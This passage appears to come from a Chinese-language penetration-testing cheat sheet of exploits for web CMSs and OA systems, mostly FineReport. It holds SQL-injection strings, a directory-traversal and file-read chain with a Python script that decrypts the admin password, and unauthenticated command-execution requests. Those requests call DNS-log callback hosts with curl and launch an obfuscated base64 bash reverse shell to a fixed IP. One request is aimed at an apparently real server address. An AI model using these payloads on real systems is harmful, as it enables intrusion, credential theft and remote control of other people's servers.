```bash
/?ids[]=1&ids[]=2 # 爆出用户名和密码
?ids[0,updatexml(0,concat(0xa,user()),0)]=1 # 错误回显敏感信息，数据库名
```

#### Truecms

`/truecms/gatewayController/gatewayLayout.do?dqdz=http://www.baidu.com`

`/TrueCMS/setup/login.do`

`/TrueCMS/WebService/InfoService?wsdl`

#### phpcms

phpcms/phpcms

https://www.hacking8.com/bug-web/Phpcms/phpcms-v9-authkey%E7%88%86%E7%A0%B4%E5%88%B0rce.html

### OA漏洞

#### FineReport

**目录遍历**

http://xxxxxxxxxxx:8080/ReportServer?op=fs\_remote\_design\&cmd=design\_list\_file\&file\_path=../ROOT/excel/tradeLog.csv\&currentUserName=admin\&currentUserId=1\&isWebReport=true

使用postman工具读取

**任意文件读取获取密码解密登录后台**

view-source:http://xxxxx:8080/ReportServer?op=chart\&cmd=get\_geo\_json\&resourcepath=privilege.xml

解密脚本：

```py
cipher = '___0022007c0039003b005100e3' #密文
PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码
Password = ""
cipher = cipher[3:] #截断三位后
for i in range(int(len(cipher) / 4)):
    c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
    c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
    Password = Password + chr(c2)
print (Password)
```

view-source:http://xxxx:8080/ReportServer?op=chart\&cmd=get\_geo\_json\&resourcepath=privilege.xml

得到的密码拿去登录后台数据决策系统

http://xxxxx:8080/ReportServer?op=fs\_load\&cmd=fs\_signin&\_=1646877801889

参考链接：

* https://mp.weixin.qq.com/s/ae8A8PGJCtr6uS11dRpzcw
* https://peiqiwiki.yuque.com/staff-ws572w/rwh2x6/ke9861

**帆软未授权命令执行**

* 影响版本

帆软报表 FineRePortv8.0 帆软报表 FineRePortv9.0

首先访问 http://218.13.34.106:8080/ReportServer?op=fr\_log\&cmd=fg\_errinfo\&fr\_username=posun

```
xxx.com/WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin

这个接口 打开 点查询 burp拦截数据包 替换post的内容

__parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('curl http://ydtfo5.ceye.io');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
```

```
POST /WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Connection: close
Content-Length: 675

__parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('curl http://hfgzn5.dnslog.cn');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
```

bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMS4xMTcuNTEuMjUzLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}

* 参考链接
  * https://github.com/ffffffff0x/1earn/blob/0583f77f62d63f93b1c519efc57327003feec4ed/1earn/Security/RedTeam/Web%E5%AE%89%E5%85%A8/BS-Exploits.md#%E5%B8%86%E8%BD%AF

POST /ReportServer?op=fr\_dialog\&cmd=parameters\_d\&sessionID=Slave\_48611 HTTP/1.1 Host: 218.13.34.106:8080 Content-Length: 288 Accept: _/_ X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://218.13.34.106:8080 Referer: http://218.13.34.106:8080/ReportServer?op=fr\_log\&cmd=fg\_errinfo\&fr\_username=posun Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: uid=edc66f8f-b932-4719-9709-7f8efdc47fb9 Connection: close

**parameters**={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR "com.fr.chart.phantom.system.SystemServiceUtils.exeCmd";CALL RUMCMD('bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMS4xMTcuNTEuMjUzLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}');select msg, trace, sinfo, logtime from fr\_errrecord where 1=1","LABEL3":"START\_TIME:","START\_TIME":"2020-08-11 00:00","LABEL5":"END\_TIME:","END\_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}

#### 致远

相关工具：https://github.com/XiaoBai-12138/OA-EXP 相关案例：渗透测试：从Web到内网：https://mp.weixin.qq.com/s/mld3C-cCY4alHQ6IyQm8Wg
